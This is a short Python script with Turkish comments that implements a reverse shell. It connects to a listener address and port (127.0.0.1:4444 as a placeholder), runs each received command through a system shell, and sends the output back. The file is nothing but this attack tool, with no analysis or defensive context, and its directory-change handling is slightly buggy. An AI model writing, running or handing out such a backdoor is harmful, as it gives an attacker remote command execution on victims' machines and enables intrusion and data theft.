import socket
import subprocess
import os

# Payload için hedef adres ve port
LHOST = '127.0.0.1'  # Sunucu IP adresi
LPORT = 4444         # Sunucu portu

def main():
    try:
        # Bağlantı kurma
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((LHOST, LPORT))
        
        while True:
            # Komut al
            command = s.recv(1024).decode()
            if command.lower() == 'exit':
                break
            
            # Komutu çalıştır ve sonuçları gönder
            if command.startswith('cd'):
                try:
                    os.chdir(command.strip('cd '))
                    s.send(b'Changed directory')
                except FileNotFoundError as e:
                    s.send(str(e).encode())
            else:
                output = subprocess.run(command, shell=True, capture_output=True)
                s.send(output.stdout + output.stderr)

    except Exception as e:
        s.send(str(e).encode())
    
    finally:
        s.close()

if __name__ == "__main__":
    main()